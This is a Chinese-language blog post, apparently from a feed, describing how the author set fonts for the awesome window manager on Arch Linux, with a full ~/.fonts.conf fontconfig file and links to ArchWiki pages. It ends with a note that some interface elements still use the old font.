&lt;p&gt;這幾天剛用 awesome window manager&lt;br /&gt;
一直在想辦法讓預設的字型變好看  &lt;/p&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;在 &lt;code&gt;~/.config/awesome/rc.lua&lt;/code&gt; 中，加入 &lt;code&gt;awesome.font = "LiHei Pro 12"&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;在 &lt;code&gt;~/.config/awesome/themes/default/theme.lua&lt;/code&gt; 中，加入 &lt;code&gt;theme.font = "LiHei Pro 10"&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;除了這兩個之外 其他以 gtk 開啟的程式預設字型真的很醜= ="&lt;br /&gt;
找了好多篇文章 最後發現應該加上 &lt;code&gt;~/.fonts.conf&lt;/code&gt; 就行了&lt;br /&gt;
參考了以下這三篇 Archwiki 的 section 之後  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Fonts#Fallback_font_order_with_X11"&gt;Fonts - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Font_configuration/Examples"&gt;Font configuration/Examples - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Chromium#Font_Rendering"&gt;Chromium - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我的 &lt;code&gt;~/.fonts.conf&lt;/code&gt; 目前長這樣  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;  
&lt;span class="cp"&gt;&amp;lt;!DOCTYPE fontconfig SYSTEM &amp;quot;fonts.dtd&amp;quot;&amp;gt;&lt;/span&gt;  

&lt;span class="nt"&gt;&amp;lt;fontconfig&amp;gt;&lt;/span&gt;  
&lt;span class="c"&gt;&amp;lt;!-- set font --&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;alias&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;family&amp;gt;&lt;/span&gt;serif&lt;span class="nt"&gt;&amp;lt;/family&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;prefer&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;family&amp;gt;&lt;/span&gt;Monaco&lt;span class="nt"&gt;&amp;lt;/family&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;family&amp;gt;&lt;/span&gt;LiHei Pro&lt;span class="nt"&gt;&amp;lt;/family&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/prefer&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/alias&amp;gt;&lt;/span&gt;  

&lt;span class="nt"&gt;&amp;lt;alias&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;family&amp;gt;&lt;/span&gt;Sans-serif&lt;span class="nt"&gt;&amp;lt;/family&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;prefer&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;family&amp;gt;&lt;/span&gt;Monaco&lt;span class="nt"&gt;&amp;lt;/family&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;family&amp;gt;&lt;/span&gt;LiHei Pro&lt;span class="nt"&gt;&amp;lt;/family&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/prefer&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/alias&amp;gt;&lt;/span&gt;  

&lt;span class="nt"&gt;&amp;lt;alias&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;family&amp;gt;&lt;/span&gt;monospace&lt;span class="nt"&gt;&amp;lt;/family&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;prefer&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;family&amp;gt;&lt;/span&gt;Monaco&lt;span class="nt"&gt;&amp;lt;/family&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/prefer&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/alias&amp;gt;&lt;/span&gt;  

&lt;span class="c"&gt;&amp;lt;!-- Chromium fonts rendering from archwiki-chromium --&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;match&lt;/span&gt; &lt;span class="na"&gt;target=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;font&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;autohint&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;bool&amp;gt;&lt;/span&gt;true&lt;span class="nt"&gt;&amp;lt;/bool&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hinting&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;bool&amp;gt;&lt;/span&gt;true&lt;span class="nt"&gt;&amp;lt;/bool&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hintstyle&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;const&amp;gt;&lt;/span&gt;hintslight&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/match&amp;gt;&lt;/span&gt;  

&lt;span class="c"&gt;&amp;lt;!-- make the font looks perfect from  &lt;/span&gt;
&lt;span class="c"&gt;tps://wiki.archlinux.org/index.php/Font_Configuration/fontconfig_Examples --&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;match&lt;/span&gt; &lt;span class="na"&gt;target=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;font&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;autohint&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;  &lt;span class="nt"&gt;&amp;lt;bool&amp;gt;&lt;/span&gt;true&lt;span class="nt"&gt;&amp;lt;/bool&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hinting&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;   &lt;span class="nt"&gt;&amp;lt;bool&amp;gt;&lt;/span&gt;false&lt;span class="nt"&gt;&amp;lt;/bool&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;lcdfilter&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nt"&gt;&amp;lt;const&amp;gt;&lt;/span&gt;lcddefault&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hintstyle&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nt"&gt;&amp;lt;const&amp;gt;&lt;/span&gt;hintslight&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;antialias&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nt"&gt;&amp;lt;bool&amp;gt;&lt;/span&gt;true&lt;span class="nt"&gt;&amp;lt;/bool&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;rgba&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;      &lt;span class="nt"&gt;&amp;lt;const&amp;gt;&lt;/span&gt;rgb&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/match&amp;gt;&lt;/span&gt;  

&lt;span class="nt"&gt;&amp;lt;match&lt;/span&gt; &lt;span class="na"&gt;target=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;font&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;test&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;pixelsize&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;qual=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;any&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;compare=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;more&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;double&amp;gt;&lt;/span&gt;15&lt;span class="nt"&gt;&amp;lt;/double&amp;gt;&amp;lt;/test&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;lcdfilter&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;const&amp;gt;&lt;/span&gt;lcdlight&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hintstyle&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;const&amp;gt;&lt;/span&gt;hintnone&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/match&amp;gt;&lt;/span&gt;  

&lt;span class="nt"&gt;&amp;lt;match&lt;/span&gt; &lt;span class="na"&gt;target=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;font&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;test&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;weight&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;compare=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;more&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;const&amp;gt;&lt;/span&gt;medium&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&amp;lt;/test&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hintstyle&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;const&amp;gt;&lt;/span&gt;hintnone&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;lcdfilter&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;const&amp;gt;&lt;/span&gt;lcdlight&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/match&amp;gt;&lt;/span&gt;  

&lt;span class="nt"&gt;&amp;lt;match&lt;/span&gt; &lt;span class="na"&gt;target=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;font&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;test&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;slant&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;compare=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;not_eq&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;double&amp;gt;&lt;/span&gt;0&lt;span class="nt"&gt;&amp;lt;/double&amp;gt;&amp;lt;/test&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hintstyle&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;const&amp;gt;&lt;/span&gt;hintnone&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;edit&lt;/span&gt; &lt;span class="na"&gt;mode=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;assign&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;lcdfilter&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;const&amp;gt;&lt;/span&gt;lcdlight&lt;span class="nt"&gt;&amp;lt;/const&amp;gt;&amp;lt;/edit&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/match&amp;gt;&lt;/span&gt;  
&lt;span class="nt"&gt;&amp;lt;/fontconfig&amp;gt;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;結果這些都弄完了以後 發現有些地方還是沒改到...  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Error" src="/files/font-config-in-arch-linux/error.png" /&gt;  &lt;/p&gt;
&lt;p&gt;這我真的不知道要怎麼改了Orz  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Fonts#Fallback_font_order_with_X11"&gt;Fonts - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Font_configuration/Examples"&gt;Font configuration/Examples - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Chromium#Font_Rendering"&gt;Chromium - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Linux"></category><category term="Arch Linux"></category><category term="awesomewm"></category><category term="font"></category></entry></feed>